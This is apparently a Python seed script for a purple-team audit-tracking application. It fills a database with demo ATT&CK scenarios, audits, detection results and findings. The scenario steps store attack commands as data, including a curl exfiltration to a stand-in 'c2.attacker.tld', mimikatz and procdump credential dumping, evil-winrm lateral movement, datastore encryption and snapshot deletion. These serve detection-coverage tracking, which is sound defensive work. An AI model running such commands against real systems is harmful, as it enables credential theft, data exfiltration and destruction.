"""Peuple la base avec des données de démonstration réalistes.

Usage : python -m app.seed
"""

from datetime import datetime, timedelta

from app.core.database import Base, SessionLocal, engine
from app.models.enums import (
    AuditStatus,
    AuditType,
    Exposure,
    FindingStatus,
    Severity,
)
from app.models.models import (
    Application,
    Audit,
    DetectionAssessment,
    Evidence,
    Finding,
    Scenario,
    Technique,
)

# Catalogue minimal de techniques ATT&CK utilisées par les scénarios.
TECHNIQUES = {
    "T1566": ("Phishing", "Initial Access"),
    "T1059": ("Command and Scripting Interpreter", "Execution"),
    "T1003": ("OS Credential Dumping", "Credential Access"),
    "T1021": ("Remote Services", "Lateral Movement"),
    "T1041": ("Exfiltration Over C2 Channel", "Exfiltration"),
    "T1190": ("Exploit Public-Facing Application", "Initial Access"),
    "T1486": ("Data Encrypted for Impact", "Impact"),
    "T1490": ("Inhibit System Recovery", "Impact"),
    "T1078": ("Valid Accounts", "Defense Evasion"),
    "T1071": ("Application Layer Protocol", "Command and Control"),
}


def reset():
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)


def run():
    reset()
    db = SessionLocal()

    # --- Techniques ---
    tech = {}
    for mid, (name, tactic) in TECHNIQUES.items():
        t = Technique(mitre_id=mid, name=name, tactic=tactic)
        db.add(t)
        tech[mid] = t
    db.flush()

    # --- Scénarios CTI ---
    from app.models.models import ScenarioStep

    apt29 = Scenario(
        name="APT29 — Spearphishing & exfiltration",
        description="Accès initial par spearphishing, vol d'identifiants, "
        "mouvement latéral puis exfiltration via C2.",
        threat_actor="APT29",
        objective="Démontrer le vol de la base clients via une intrusion ciblée.",
        engagement_type=AuditType.purple_team,
        sophistication="Avancé",
        ioc="hash:ab12...; domain:mail-secure[.]net",
        ioa="Connexion PowerShell sortante anormale",
        references="https://attack.mitre.org/groups/G0016/",
    )
    apt29.techniques = [tech[m] for m in ("T1566", "T1059", "T1003", "T1021", "T1041")]
    apt29.steps = [
        ScenarioStep(order=1, tactic="Initial Access", mitre_id="T1566",
                     technique_name="Phishing",
                     action="swaks --to user@corp --attach payload.docx",
                     description="Envoi d'un email de spearphishing avec pièce jointe piégée."),
        ScenarioStep(order=2, tactic="Execution", mitre_id="T1059",
                     technique_name="Command and Scripting Interpreter",
                     action="powershell -enc JABzAD0A...",
                     description="Exécution d'une charge PowerShell après ouverture du document."),
        ScenarioStep(order=3, tactic="Credential Access", mitre_id="T1003",
                     technique_name="OS Credential Dumping",
                     action="mimikatz sekurlsa::logonpasswords",
                     description="Extraction des identifiants en mémoire du poste compromis."),
        ScenarioStep(order=4, tactic="Lateral Movement", mitre_id="T1021",
                     technique_name="Remote Services",
                     action="evil-winrm -i 10.0.2.15 -u svc_crm",
                     description="Rebond latéral vers le serveur applicatif via WinRM."),
        ScenarioStep(order=5, tactic="Exfiltration", mitre_id="T1041",
                     technique_name="Exfiltration Over C2 Channel",
                     action="curl -F file=@clients.zip https://c2.attacker.tld",
                     description="Exfiltration de l'archive via le canal C2 chiffré (HTTPS)."),
    ]

    ransom = Scenario(
        name="Ransomware ESXi",
        description="Exploitation d'une appli exposée, exécution de scripts, "
        "chiffrement des datastores et sabotage des sauvegardes.",
        threat_actor="Scattered Spider",
        objective="Évaluer la résilience face à un ransomware ciblant l'hyperviseur.",
        engagement_type=AuditType.red_team,
        sophistication="Avancé",
        ioc="ip:185.220.x.x",
        ioa="Suppression massive de snapshots",
        references="https://attack.mitre.org/",
    )
    ransom.techniques = [tech[m] for m in ("T1190", "T1059", "T1486", "T1490")]
    ransom.steps = [
        ScenarioStep(order=1, tactic="Initial Access", mitre_id="T1190",
                     technique_name="Exploit Public-Facing Application",
                     action="curl -X POST https://vcenter/ui --data @exploit",
                     description="Exploitation d'une vulnérabilité sur vCenter exposé."),
        ScenarioStep(order=2, tactic="Execution", mitre_id="T1059",
                     technique_name="Command and Scripting Interpreter",
                     action="esxcli system syslog ...",
                     description="Exécution de commandes sur les hôtes ESXi."),
        ScenarioStep(order=3, tactic="Impact", mitre_id="T1486",
                     technique_name="Data Encrypted for Impact",
                     action="./encryptor /vmfs/volumes",
                     description="Chiffrement des datastores des machines virtuelles."),
        ScenarioStep(order=4, tactic="Impact", mitre_id="T1490",
                     technique_name="Inhibit System Recovery",
                     action="snapshot rm --all",
                     description="Suppression des snapshots pour empêcher la restauration."),
    ]

    fin7 = Scenario(
        name="FIN7 — Comptes valides & C2",
        description="Usage de comptes valides et persistance via C2 applicatif.",
        threat_actor="FIN7",
        objective="Tester la détection d'un accès via comptes légitimes compromis.",
        engagement_type=AuditType.purple_team,
        sophistication="Intermédiaire",
        references="https://attack.mitre.org/groups/G0046/",
    )
    fin7.techniques = [tech[m] for m in ("T1078", "T1071", "T1003")]
    fin7.steps = [
        ScenarioStep(order=1, tactic="Defense Evasion", mitre_id="T1078",
                     technique_name="Valid Accounts",
                     action="login svc_pay (creds volés)",
                     description="Connexion via un compte de service compromis."),
        ScenarioStep(order=2, tactic="Command and Control", mitre_id="T1071",
                     technique_name="Application Layer Protocol",
                     action="beacon https://cdn.attacker.tld",
                     description="Établissement d'un canal C2 sur protocole applicatif."),
        ScenarioStep(order=3, tactic="Credential Access", mitre_id="T1003",
                     technique_name="OS Credential Dumping",
                     action="procdump lsass.exe",
                     description="Récupération d'identifiants supplémentaires."),
    ]

    db.add_all([apt29, ransom, fin7])
    db.flush()

    # --- Applications ---
    crm = Application(
        name="CRM Clients",
        description="Application de gestion de la relation client.",
        owner="A. Durand", team="Sales IT", email="crm-team@corp.example",
        exposure=Exposure.internet,
        technologies="Java JDK (Oracle), PostgreSQL, Nginx",
        technologies_cpe='[{"cpe":"cpe:2.3:a:oracle:jdk:*:*:*:*:*:*:*:*","vendor":"Oracle","product":"Java JDK"},{"cpe":"cpe:2.3:a:postgresql:postgresql:*:*:*:*:*:*:*:*","vendor":"PostgreSQL","product":"PostgreSQL"},{"cpe":"cpe:2.3:a:nginx:nginx:*:*:*:*:*:*:*:*","vendor":"Nginx","product":"Nginx"}]',
        url="https://crm.corp.example",
        dic_availability=5, dic_integrity=5, dic_confidentiality=4,
    )
    pay = Application(
        name="Plateforme Paiement",
        description="Traitement des transactions de paiement.",
        owner="M. Leroy", team="FinTech", email="pay-team@corp.example",
        exposure=Exposure.internet,
        technologies="Go (Golang), Apache Kafka, Redis",
        technologies_cpe='[{"cpe":"cpe:2.3:a:golang:go:*:*:*:*:*:*:*:*","vendor":"Google","product":"Go (Golang)"},{"cpe":"cpe:2.3:a:apache:kafka:*:*:*:*:*:*:*:*","vendor":"Apache","product":"Kafka"},{"cpe":"cpe:2.3:a:redis:redis:*:*:*:*:*:*:*:*","vendor":"Redis","product":"Redis"}]',
        url="https://pay.corp.example",
        dic_availability=5, dic_integrity=5, dic_confidentiality=5,
    )
    vmware = Application(
        name="Infra Virtualisation",
        description="Cluster ESXi hébergeant les charges critiques.",
        owner="S. Petit", team="Infra", email="infra@corp.example",
        exposure=Exposure.interne,
        technologies="VMware ESXi, VMware vCenter",
        technologies_cpe='[{"cpe":"cpe:2.3:a:vmware:esxi:*:*:*:*:*:*:*:*","vendor":"VMware","product":"VMware ESXi"},{"cpe":"cpe:2.3:a:vmware:vcenter_server:*:*:*:*:*:*:*:*","vendor":"VMware","product":"VMware vCenter"}]',
        dic_availability=5, dic_integrity=4, dic_confidentiality=3,
    )
    db.add_all([crm, pay, vmware])
    db.flush()

    now = datetime.utcnow()

    # --- Audits + évaluations détection/réaction ---
    def make_audit(app, scenario, name, results_map, *,
                   audit_type=AuditType.purple_team, team="Purple Team",
                   status=AuditStatus.completed, start_offset=10, end_offset=3,
                   killchain=None):
        """results_map : {mitre_id: (detected, responded, det_min, resp_min)}
        killchain   : {mitre_id: (ordre, description, commande)}  (optionnel)
        end_offset=None => mission continue (pas de date de fin)."""
        killchain = killchain or {}
        audit = Audit(
            name=name, audit_type=audit_type,
            status=status, application_id=app.id,
            team=team,
            start_date=now - timedelta(days=start_offset),
            end_date=(None if end_offset is None else now - timedelta(days=end_offset)),
        )
        audit.scenarios.append(scenario)
        db.add(audit)
        db.flush()
        for mid, (det, resp, dt, rt) in results_map.items():
            order, desc, cmd = killchain.get(mid, (None, "", ""))
            db.add(DetectionAssessment(
                audit_id=audit.id, technique_id=tech[mid].id,
                detected=int(det), responded=int(resp),
                detection_time_min=dt, response_time_min=rt,
                step_order=order, step_description=desc, command=cmd,
            ))
        return audit

    # CRM vs APT29 : BAS interne en cours (mission la PLUS RÉCENTE).
    # T1003 y est désormais détectée — alors qu'un pentest plus ancien l'avait
    # manquée. La matrice consolidée doit retenir cette dernière valeur.
    a1 = make_audit(crm, apt29, "Purple Team CRM — APT29 Q2", {
        "T1566": (True, True, 8, 22),
        "T1059": (True, False, 15, None),
        "T1003": (True, False, 40, None),
        "T1021": (True, True, 31, 55),
        "T1041": (True, False, 44, None),
    }, audit_type=AuditType.bas, team="SOC interne · Cymulate",
       status=AuditStatus.in_progress, start_offset=11, end_offset=None,
       killchain={
        "T1566": (1, "Envoi d'un email de spearphishing avec pièce jointe piégée.",
                  "swaks --to user@corp --body @phish.html --attach payload.docx"),
        "T1059": (2, "Exécution d'une charge PowerShell après ouverture du document.",
                  "powershell -enc JABzAD0ATgBlAHcA..."),
        "T1003": (3, "Extraction des identifiants en mémoire du poste compromis.",
                  "mimikatz sekurlsa::logonpasswords"),
        "T1021": (4, "Rebond latéral vers le serveur applicatif via WinRM.",
                  "evil-winrm -i 10.0.2.15 -u svc_crm"),
        "T1041": (5, "Exfiltration de l'archive via le canal C2 chiffré (HTTPS).",
                  "curl -F file=@clients.zip https://c2.attacker.tld"),
       })

    # CRM : seconde mission, pentest externe clôturé (plus ancienne).
    # Elle avait elle aussi testé T1003, sans succès à l'époque.
    a1b = make_audit(crm, apt29, "Pentest CRM — Synacktiv", {
        "T1003": (False, False, None, None),
    }, audit_type=AuditType.pentest, team="Synacktiv · Externe",
       status=AuditStatus.closed, start_offset=23, end_offset=14)

    # Paiement vs FIN7 : détection forte
    a2 = make_audit(pay, fin7, "Purple Team Paiement — FIN7", {
        "T1078": (True, True, 5, 12),
        "T1071": (True, True, 18, 40),
        "T1003": (True, False, 25, None),
    }, team="Red Team interne", start_offset=8, end_offset=2)

    # Infra vs Ransomware : faible couverture (cas à risque)
    a3 = make_audit(vmware, ransom, "Purple Team Infra — Ransomware ESXi", {
        "T1190": (True, False, 60, None),
        "T1059": (False, False, None, None),
        "T1486": (False, False, None, None),
        "T1490": (False, False, None, None),
    }, audit_type=AuditType.red_team, team="Synacktiv · Externe",
       status=AuditStatus.completed, start_offset=15, end_offset=5)

    # --- Vulnérabilités ---
    db.add_all([
        Finding(title="Injection SQL formulaire de recherche",
                description="Paramètre 'q' non assaini.", impact="Accès BDD complet",
                cvss=9.1, severity=Severity.critical, status=FindingStatus.open,
                owasp="A03", cwe="CWE-89", capec="CAPEC-66", application_id=crm.id, audit_id=a1.id),
        Finding(title="Stored XSS espace client", cvss=7.4, severity=Severity.high,
                status=FindingStatus.assigned, owasp="A03", cwe="CWE-79",
                application_id=crm.id, audit_id=a1.id),
        Finding(title="Secrets en clair dans les logs", cvss=6.5, severity=Severity.medium,
                status=FindingStatus.in_progress, cwe="CWE-532", application_id=crm.id),
        Finding(title="Contournement contrôle d'autorisation", cvss=8.8,
                severity=Severity.critical, status=FindingStatus.validated,
                owasp="A01", cwe="CWE-285", application_id=pay.id, audit_id=a2.id),
        Finding(title="TLS faible (TLS 1.0 accepté)", cvss=5.3, severity=Severity.medium,
                status=FindingStatus.open, owasp="A02", application_id=pay.id),
        Finding(title="vCenter non patché (CVE critique)", cvss=9.8,
                severity=Severity.critical, status=FindingStatus.open,
                cwe="CWE-787", application_id=vmware.id, audit_id=a3.id),
        Finding(title="Snapshots non protégés", cvss=7.0, severity=Severity.high,
                status=FindingStatus.open, application_id=vmware.id, audit_id=a3.id),
    ])

    # --- Evidence (métadonnées) ---
    db.add_all([
        Evidence(audit_id=a1.id, filename="phishing_email.eml", kind="payload",
                 tags="apt29,initial-access", storage_key="vault/a1/phishing_email.eml",
                 sha256="d41d8cd98f00b204e9800998ecf8427e"),
        Evidence(audit_id=a1.id, filename="lateral_movement.pcap", kind="pcap",
                 tags="apt29,lateral", storage_key="vault/a1/lateral_movement.pcap"),
        Evidence(audit_id=a3.id, filename="esxi_encrypt.log", kind="log",
                 tags="ransomware,impact", storage_key="vault/a3/esxi_encrypt.log"),
    ])

    db.commit()
    db.close()
    print("Base peuplée : 3 applications, 3 scénarios, 3 audits, 7 vulnérabilités.")


if __name__ == "__main__":
    run()
